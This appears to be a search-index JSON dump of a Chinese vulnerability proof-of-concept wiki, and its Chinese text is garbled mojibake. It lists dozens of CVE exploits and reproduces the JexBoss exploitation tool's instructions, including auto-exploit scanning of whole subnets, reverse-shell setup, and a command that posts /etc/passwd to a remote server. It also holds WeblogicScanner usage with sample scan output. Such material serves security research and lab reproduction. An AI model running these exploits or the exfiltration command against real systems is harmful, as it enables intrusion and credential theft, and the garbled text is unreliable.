{"./":{"url":"./","title":"å…³äºæ–‡åº“","keywords":"","body":"WgpSec POCæ–‡åº“ğŸ‘ å…³äºæ–‡åº“ å¦‚ä»Šæ¼æ´çš„å„ç§å¤ç°æ–‡ç« å·²ç»å¡«æ»¡äº†äº’è”ç½‘ï¼Œä½†æ˜¯æ¯æ¬¡å»å°è¯•æ¼æ´å¤ç°æ—¶ï¼Œæ€»ä¼šçº ç»“äºç¯å¢ƒæ­å»ºï¼ŒPOCå’Œæ¼æ´åŸç†ä¸Šã€‚ ç”±äºè¿™äº›å› ç´ ï¼Œé€šå¸¸éƒ½éœ€è¦ç¿»é˜…å¾ˆå¤šå¾ˆå¤šçš„æ–‡ç« æ‰èƒ½ç†è§£è¿™ä¸ªæ¼æ´ï¼Œäºæ˜¯ï¼Œä¾¿èŒç”Ÿäº†æŠŠç¯å¢ƒæ­å»ºï¼ŒPOCï¼Œæ¼æ´åŸç†å…¨éƒ¨é›†åˆåœ¨ä¸€ä¸ªæ–‡åº“çš„æƒ³æ³•ï¼ŒWgpSec POCæ–‡åº“ä¾¿ç”±æ­¤è€Œæ¥ğŸ£ å…³äºä½¿ç”¨ æ–‡åº“ä½¿ç”¨çš„æ˜¯Gitbookï¼Œå› ä¸ºé£æ ¼æ¯”è¾ƒæ¸…æ–°ï¼Œç®€æ´ã€‚äºæ˜¯ä¾¿é€‰æ‹©äº†å®ƒæ¥æ­å»ºæ–‡åº“ã€‚ ç›®å‰Wikiæ–‡åº“æ˜¯å¼€æºçš„ï¼Œæ¯ä¸€ä¸ªäººéƒ½å¯ä»¥ä¸‹è½½éšæ—¶ç¿»é˜…ğŸ¬ åœ¨çº¿æŸ¥é˜… Githubé“¾æ¥ ç äº‘é“¾æ¥ [!NOTE] POCæ–‡ä»¶éƒ½å­˜æ”¾äºæ¼æ´åˆ†ç±»åçš„POCç›®å½•ä¸­ æ‰«æå·¥å…·æ–‡ä»¶å­˜æ”¾äºæ¼æ´åˆ†ç±»åçš„Scanç›®å½•ä¸­ Goby POC å­˜æ”¾äº Goby & POCç›®å½•ä¸­ [!NOTE] ç½‘ç«™ç›®å½•ä¸Šæ–¹æ”¯æŒæ­£åˆ™æœç´¢å…³é”®å­—å¿«é€ŸæŸ¥çœ‹ [!NOTE] è¾¹æ¡†å¯ä»¥è°ƒæ•´ï¼Œå­—ä½“å¤§å°å’ŒèƒŒæ™¯ä¹Ÿæ”¯æŒæ›´æ¢ [!NOTE] Goby & POC ä¸­çš„ json æ–‡ä»¶å¯è¢«å¯¼å…¥Gobyå¿«é€ŸéªŒè¯æ¼æ´ å¦‚ä½•æœ¬åœ°ä½¿ç”¨ [!NOTE] 1.Github æ‹‰å–ä»£ç  git clone https://gitee.com/yelisenyu/wiki.git git clone https://github.com/PeiQi0/wiki.git 2.ä¸‹è½½ gitbook apt install npm npm install gitbook-cli -g 3.æ‰“å¼€Wikiçš„ç›®å½•ä¸‹æ‰§è¡Œ gitbook serve 4.è®¿é—® http://localhost:4000 å³å¯ ä¹Ÿå¯ä»¥å°† _book ä½œä¸ºç½‘ç«™æ ¹ç›®å½•æ¥æ­å»ºæ–‡åº“(æ­¤ç›®å½•ä¸ºå·²ç»ç¼–è¯‘å¥½çš„htmlæ ¼å¼) æœ€å [!NOTE] ä¸‹é¢å°±æ˜¯æ–‡åº“å’Œå›¢é˜Ÿçš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨å…¬ä¼—å· åˆ«å¿˜äº†Githubä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"Goby & POC.html":{"url":"Goby & POC.html","title":"Goby & POC","keywords":"","body":"Goby & POC æ›´æ–°æ—¶é—´çº¿è®°å½•ğŸŸ 2021-1-22 Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109 2021-1-21 Apache_ActiveMQ_Console_Weak_Password 2021-1-21 Lanproxy_Arbitrary_File_Read_CVE_2021_3019 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"TIME.html":{"url":"TIME.html","title":"æ›´æ–°æ—¶é—´çº¿è®°å½•","keywords":"","body":"æ–‡åº“æ›´æ–°æ—¶é—´çº¿è®°å½•ğŸ¦„ 2021-1-22 Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109 2021-1-21 Apache ActiveMQ ååºåˆ—åŒ–æ¼æ´ CVE-2015-5254 2021-1-21 OKLite 1.2.25 åå°é£æ ¼æ¨¡å— ä»»æ„æ–‡ä»¶åˆ é™¤ CVE-2019-16132 2021-1-21 OKLite 1.2.25 åå°æ’ä»¶å®‰è£… ä»»æ„æ–‡ä»¶ä¸Šä¼  2021-1-20 OKLite 1.2.25 åå°æ¨¡å—å¯¼å…¥ ä»»æ„æ–‡ä»¶ä¸Šä¼  CVE-2019-16131 2021-1-18 JumpServer æœªæˆæƒæ¥å£ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2021-1-17 Laravel å°äº 8.4.2 Debugæ¨¡å¼ _ignition è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-3129 2021-1-16 Apache ActiveMQ Consoleæ§åˆ¶å° å­˜åœ¨é»˜è®¤å¼±å£ä»¤ 2021-1-16 DVR ç™»å½•ç»•è¿‡æ¼æ´ CVE-2018-9995 2021-1-13 Lanproxy ç›®å½•éå†æ¼æ´ CVE-2021-3019 2021-1-11 è‡´è¿œOA ajax.doç™»å½•ç»•è¿‡ ä»»æ„æ–‡ä»¶ä¸Šä¼  CNVD-2021-01627 2021-1-7 QEMU è™šæ‹Ÿæœºé€ƒé€¸æ¼æ´ CVE-2020-14364 2021-1-7 Zyxel ç¡¬ç¼–ç åé—¨è´¦æˆ·æ¼æ´ CVE-2020-29583 2021-1-6 Apache Flink ç›®å½•éå†æ¼æ´ CVE-2020-17519 2021-1-6 Apache Flink å°äº1.9.1è¿œç¨‹ä»£ç æ‰§è¡Œ CVE-2020-17518 2021-1-5 F5 BIG-IP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-5902 2021-1-3 Seo-Panel 4.8.0 åå°„å‹XSSæ¼æ´ CVE-2021-3002 2021-1-3 YzmCMS Version å°äºV5.8æ­£å¼ç‰ˆ åå°é‡‡é›†æ¨¡å— SSRFæ¼æ´ 2021-1-2 Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601 2020-12-24 Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796 2020-12-18 Typesetter CMS 5-5.1 ä»»æ„æ–‡ä»¶ä¸Šä¼  2020-12-15 JBoss 4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´ CVE-2017-7504 2020-12-12 OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160 2020-12-12 Apache HTTPd æ¢è¡Œè§£ææ¼æ´ CVE-2017-15715 2020-12-12 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938 2020-12-11 Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935 2020-12-9 Discuz!X å°äº3.4 R20191201 åå°SQLæ³¨å…¥æ¼æ´ 2020-12-8 Redis å°äº5.0.5 ä¸»ä»å¤åˆ¶ RCE 2020-12-9 é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½• 2020-12-7 é€šè¾¾OA v11.2åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ 2020-12-7 é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE 2020-12-7 é€šè¾¾OA v11.7åå°SQLæ³¨å…¥ 2020-12-6 è‡´è¿œOA A8 htmlofficeservlet RCEæ¼æ´ 2020-12-6 è‡´è¿œOA Sessionæ³„æ¼æ¼æ´ 2020-12-5 æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204 2020-12-5 æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´ 2020-12-5 æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥ 2020-12-5 æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å– 2020-11-26 å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´ 2020-11-26 é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ 2020-11-26 ç¦…é“ 11.6ç‰ˆæœ¬ SQLæ³¨å…¥æ¼æ´ 2020-11-24 ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923 2020-11-22 ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ 2020-11-22 ç¦…é“ 11.6ç‰ˆæœ¬ ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´ 2020-11-21 Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-1956 2020-11-19 Weiphp5.0 å‰å°æ–‡ä»¶ä»»æ„è¯»å– CNVD-2020-68596 2020-11-20 Weiphp5.0 ä»»æ„ç”¨æˆ·Cookieä¼ªé€  2020-11-19 åå®œäº’è”CMSé»˜è®¤å­˜åœ¨è¶…çº§ç®¡ç†å‘˜æ¼æ´ 2020-11-18 Citrix XenMobile ä»»æ„æ–‡ä»¶è¯»å– CVE-2020-8209 2020-11-17 å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBå‘½ä»¤æ‰§è¡Œæ¼æ´ 2020-11-17 å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBä»»æ„ç™»é™† 2020-11-17 é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ² 2020-11-14 CISCO ASAè®¾å¤‡ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ CVE-2020-3452 2020-11-13 æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552 2020-11-13 æ·±ä¿¡æœåå°ä»»æ„ç”¨æˆ·ç™»é™†æ¼æ´ 2020-11-13 TP-Link SR20 è¿œç¨‹å‘½ä»¤æ‰§è¡Œ 2020-11-13 å®å¡” phpmyadminæœªæˆæƒè®¿é—®æ¼æ´ 2020-11-12 ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ CNVD-2020-68552 2020-11-12 ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325 2020-11-11 Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759 2020-11-11 Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529 2020-11-11 Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271 2020-11-9 Apache Kylin å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2020-13925 2020-11-8 Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615 2020-11-8 Apache Cocoon XMLæ³¨å…¥ CVE-2020-11991 2020-11-8 Apache Shiro å°äº1.2.4ååºåˆ—åŒ–æ¼æ´ CVE-2016-4437 2020-11-7 Apache Kylinçš„æœªæˆæƒé…ç½®æ³„éœ² 2020-11-7 Apache Solr JMXæœåŠ¡ RCE CVE-2019-12409 2020-11-7 Apache Solr RCE æœªæˆæƒä¸Šä¼ æ¼æ´ CVE-2020-13957 2020-11-7 Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 2020-11-7 Apache Solr XXE æ¼æ´ CVE-2017-12629 2020-11-7 Apache Solr è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2019-0193 2020-11-7 æè‡´CMS 1.81ä»¥ä¸‹ç‰ˆæœ¬ å­˜å‚¨å‹XSS 2020-11-7 æè‡´CMS_1.71_1.7_1.67ç‰ˆæœ¬sqlæ³¨å…¥ 2020-11-7 æè‡´CMS_å…¨ç‰ˆæœ¬ä»»æ„æ–‡ä»¶ä¸Šä¼  WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:21 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/","title":"WebæœåŠ¡å™¨æ¼æ´","keywords":"","body":"WebæœåŠ¡å™¨æ¼æ´ğŸ¦” WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/","title":"Jboss","keywords":"","body":"Jboss WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/Scan/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/Scan/","title":"æ‰«æå·¥å…·","keywords":"","body":"æ‰«æå·¥å…· Jexboss WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/Scan/æ‰«æå·¥å…· Jexboss.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/Scan/æ‰«æå·¥å…· Jexboss.html","title":"æ‰«æå·¥å…· Jexboss","keywords":"","body":"JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc. Requirements Python >= 2.7.x urllib3 ipaddress Installation on Linux\\Mac To install the latest version of JexBoss, please use the following commands: git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 OR: Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip unzip master.zip cd jexboss-master pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 If you are using CentOS with Python 2.6, please install Python2.7. Installation example of the Python 2.7 on CentOS using Collections Software scl: yum -y install centos-release-scl yum -y install python27 scl enable python27 bash Installation on Windows If you are using Windows, you can use the Git Bash to run the JexBoss. Follow the steps below: Download and install Python Download and install Git for Windows After installing, run the Git for Windows and type the following commands: PATH=$PATH:C:\\Python27\\ PATH=$PATH:C:\\Python27\\Scripts git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 Features The tool and exploits were developed and tested for: JBoss Application Server versions: 3, 4, 5 and 6. Java Deserialization Vulnerabilities in multiple java frameworks, platforms and applications (e.g., Java Server Faces - JSF, Seam Framework, RMI over HTTP, Jenkins CLI RCE (CVE-2015-5317), Remote JMX (CVE-2016-3427, CVE-2016-8735), etc) The exploitation vectors are: /admin-console tested and working in JBoss versions 5 and 6 /jmx-console tested and working in JBoss versions 4, 5 and 6 /web-console/Invoker tested and working in JBoss versions 4, 5 and 6 /invoker/JMXInvokerServlet tested and working in JBoss versions 4, 5 and 6 Application Deserialization tested and working against multiple java applications, platforms, etc, via HTTP POST Parameters Servlet Deserialization tested and working against multiple java applications, platforms, etc, via servlets that process serialized objets (e.g. when you see an \"Invoker\" in a link) Apache Struts2 CVE-2017-5638 tested in Apache Struts 2 applications Others Videos Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam Applications via javax.faces.ViewState with JexBoss Exploiting JBoss Application Server with JexBoss Exploiting Apache Struts2 (RCE) with Jexboss (CVE-2017-5638) Screenshots Simple usage examples: $ python jexboss.py Example of standalone mode against JBoss: $ python jexboss.py -u http://192.168.0.26:8080 Usage modes: $ python jexboss.py -h Network scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt Network scan with auto-exploit mode: $ python jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -results results.txt Results and recommendations: Reverse Shell (meterpreter integration) After you exploit a JBoss server, you can use the own jexboss command shell or perform a reverse connection using the following command: jexremote=YOUR_IP:YOUR_PORT Example: Shell>jexremote=192.168.0.10:4444 Example: When exploiting java deserialization vulnerabilities (Application Deserialization, Servlet Deserialization), the default options are: make a reverse shell connection or send a commando to execute. Usage examples For Java Deserialization Vulnerabilities in a custom HTTP parameter and to send a custom command to be executed on the exploited server: $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server' For Java Deserialization Vulnerabilities in a custom HTTP parameter and to make a reverse shell (this will ask for an IP address and port of your remote host): $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name For Java Deserialization Vulnerabilities in a Servlet (like Invoker): $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize For Apache Struts 2 (CVE-2017-5638) $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 For Apache Struts 2 (CVE-2017-5638) with cookies for authenticated resources $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 --cookies \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\" Auto scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log File scan mode: $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log More Options: optional arguments: -h, --help show this help message and exit --version show program's version number and exit --auto-exploit, -A Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!) --disable-check-updates, -D Disable two updates checks: 1) Check for updates performed by the webshell in exploited server at http://webshell.jexboss.net/jsp_version.txt and 2) check for updates performed by the jexboss client at http://joaomatosf.com/rnp/releases.txt -mode {standalone,auto-scan,file-scan} Operation mode (DEFAULT: standalone) --app-unserialize, -j Check for java unserialization vulnerabilities in HTTP parameters (eg. javax.faces.ViewState, oldFormData, etc) --servlet-unserialize, -l Check for java unserialization vulnerabilities in Servlets (like Invoker interfaces) --jboss Check only for JBOSS vectors. --jenkins Check only for Jenkins CLI vector. --jmxtomcat Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and CVE-2016-8735). OBS: Will not be checked by default. --proxy PROXY, -P PROXY Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128) --proxy-cred LOGIN:PASS, -L LOGIN:PASS Proxy authentication credentials (eg -L name:password) --jboss-login LOGIN:PASS, -J LOGIN:PASS JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 (default: admin:admin) --timeout TIMEOUT Seconds to wait before timeout connection (default 3) Standalone mode: -host HOST, -u HOST Host address to be checked (eg. -u http://192.168.0.10:8080) Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER): --reverse-host RHOST:RPORT, -r RHOST:RPORT Remote host address and port for reverse shell when exploiting Java Deserialization Vulnerabilities in application layer (for now, working only against *nix systems)(eg. 192.168.0.10:1331) --cmd CMD, -x CMD Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server) --windows, -w Specifies that the commands are for rWINDOWS System$ (cmd.exe) --post-parameter PARAMETER, -H PARAMETER Specify the parameter to find and inject serialized objects into it. (egs. -H javax.faces.ViewState or -H oldFormData (Questions, problems, suggestions and etc: joaomatosf@gmail.com WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/JBoss 4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´ CVE-2017-7504.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/JBoss 4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´ CVE-2017-7504.html","title":"JBoss 4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´ CVE-2017-7504","keywords":"","body":"JBoss 4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´ CVE-2017-7504 æ¼æ´æè¿° Red Hat JBoss Application Server æ˜¯ä¸€æ¬¾åŸºäºJavaEEçš„å¼€æºåº”ç”¨æœåŠ¡å™¨ã€‚JBoss AS 4.xåŠä¹‹å‰ç‰ˆæœ¬ä¸­ï¼ŒJbossMQå®ç°è¿‡ç¨‹çš„JMS over HTTP Invocation Layerçš„HTTPServerILServlet.javaæ–‡ä»¶å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„åºåˆ—åŒ–æ•°æ®åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] JBoss AS 4.xåŠä¹‹å‰ç‰ˆæœ¬ ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose build docker-compose up -d æ¼æ´å¤ç° è®¿é—®æ§åˆ¶å° ä½¿ç”¨å·¥å…· Jexboss è¿›è¡Œæ¼æ´æ‰«æ python3 jexboss.py -host http://192.168.51.133:8080 æˆåŠŸåˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/","title":"Weblogic","keywords":"","body":"Weblogic Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271 Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Scan/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Scan/","title":"æ‰«æå·¥å…·","keywords":"","body":"æ‰«æå·¥å…· WeblogicScanner WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Scan/æ‰«æå·¥å…· WeblogicScanner.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Scan/æ‰«æå·¥å…· WeblogicScanner.html","title":"æ‰«æå·¥å…· WeblogicScanner","keywords":"","body":"WeblogicScanner æ¼æ´æ‰«æ æºå·¥å…·é“¾æ¥ï¼šhttps://github.com/rabbitmask/WeblogicScan weblogicScaner ç®€ä½“ä¸­æ–‡ | English æˆªè‡³ 2020 å¹´ 11 æœˆ 27 æ—¥ï¼Œweblogic æ¼æ´æ‰«æå·¥å…·ã€‚è‹¥å­˜åœ¨æœªè®°å½•ä¸”å·²å…¬å¼€ POC çš„æ¼æ´ï¼Œæ¬¢è¿æäº¤ issueã€‚ åŸä½œè€…å·²ç»æ”¶é›†å¾—æ¯”è¾ƒå®Œæ•´äº†ï¼Œåœ¨è¿™é‡Œåšäº†éƒ¨åˆ†çš„ bug ä¿®å¤ï¼Œéƒ¨åˆ†è„šæœ¬ POC æœªç”Ÿæ•ˆï¼Œé…ç½®é”™è¯¯ç­‰é—®é¢˜ã€‚ä¹‹å‰æŸ¥äº†ä¸€ä¸‹å‘ç°éƒ¨åˆ† POC æ— æ³•ä½¿ç”¨ã€‚åœ¨è¿™ä¸ªé¡¹ç›®é‡Œé¢å¯¹è„šæœ¬åšäº†ä¸€äº›ä¿®æ”¹ï¼Œæé«˜å‡†ç¡®ç‡ã€‚ æ³¨æ„ï¼šéƒ¨åˆ†æ¼æ´ç”±äºç¨³å®šæ€§åŸå› éœ€è¦å¤šæ¬¡æµ‹è¯•æ‰å¯éªŒè¯ ç›®å‰å¯æ£€æµ‹æ¼æ´ç¼–å·æœ‰ï¼ˆéƒ¨åˆ†éåŸç†æ£€æµ‹ï¼Œéœ€æ‰‹åŠ¨éªŒè¯ï¼‰ï¼š weblogic administrator console CVE-2014-4210 CVE-2016-0638 CVE-2016-3510 CVE-2017-3248 CVE-2017-3506 CVE-2017-10271 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2018-3191 CVE-2018-3245 CVE-2018-3252 CVE-2019-2618 CVE-2019-2725 CVE-2019-2729 CVE-2019-2890 CVE-2020-2551 CVE-2020-14882 CVE-2020-14883 å¿«é€Ÿå¼€å§‹ ä¾èµ– python >= 3.6 è¿›å…¥é¡¹ç›®ç›®å½•ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…ä¾èµ–åº“ $ pip3 install requests ä½¿ç”¨è¯´æ˜ usage: ws.py [-h] -t TARGETS [TARGETS ...] -v VULNERABILITY [VULNERABILITY ...] [-o OUTPUT] optional arguments: -h, --help å¸®åŠ©ä¿¡æ¯ -t TARGETS [TARGETS ...], --targets TARGETS [TARGETS ...] ç›´æ¥å¡«å…¥ç›®æ ‡æˆ–æ–‡ä»¶åˆ—è¡¨ï¼ˆé»˜è®¤ä½¿ç”¨ç«¯å£7001ï¼‰. ä¾‹å­ï¼š 127.0.0.1:7001 -v VULNERABILITY [VULNERABILITY ...], --vulnerability VULNERABILITY [VULNERABILITY ...] æ¼æ´åç§°æˆ–CVEç¼–å·ï¼Œä¾‹å­ï¼š\"weblogic administrator console\" -o OUTPUT, --output OUTPUT è¾“å‡º json ç»“æœçš„è·¯å¾„ã€‚é»˜è®¤ä¸è¾“å‡ºç»“æœ -s, --ssl å¼ºåˆ¶ä½¿ç”¨ https åè®®è¯·æ±‚ ç»“æœæ ·ä¾‹ (venv) ~/weblogicScanner$ python ws.py -t 192.168.124.129 [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Start... [23:03:04][INFO] [+][Weblogic Console][192.168.56.129:7001] Found module! [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Please verify manually! [23:03:04][INFO] [*][CVE-2014-4210][192.168.56.129:7001] Start... [23:03:04][INFO] [-][CVE-2014-4210][192.168.56.129:7001] Not found. [23:03:04][INFO] [*][CVE-2016-0638][192.168.56.129:7001] Start... [23:03:06][INFO] [-][CVE-2016-0638][192.168.56.129:7001] Not vulnerability. [23:03:06][INFO] [*][CVE-2016-3510][192.168.56.129:7001] Start... [23:03:08][INFO] [-][CVE-2016-3510][192.168.56.129:7001] Not vulnerability. [23:03:08][INFO] [*][CVE-2017-3248][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3248][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-3506][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3506][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-10271][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-10271][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2018-2628][192.168.56.129:7001] Start... [23:03:14][INFO] [+][CVE-2018-2628][192.168.56.129:7001] Exists vulnerability! [23:03:14][INFO] [*][CVE-2018-2893][192.168.56.129:7001] Start... [23:03:18][INFO] [+][CVE-2018-2893][192.168.56.129:7001] Exists vulnerability! [23:03:18][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Start... [23:03:19][INFO] [+][CVE-2018-2894][192.168.56.129:7001] Found module! [23:03:19][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Please verify manually! [23:03:19][INFO] [*][CVE-2018-3191][192.168.56.129:7001] Start... [23:03:23][INFO] [+][CVE-2018-3191][192.168.56.129:7001] Exists vulnerability! [23:03:23][INFO] [*][CVE-2018-3245][192.168.56.129:7001] Start... [23:03:29][INFO] [-][CVE-2018-3245][192.168.56.129:7001] Not vulnerability. [23:03:29][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2018-3252][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2019-2618][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Please verify manually! 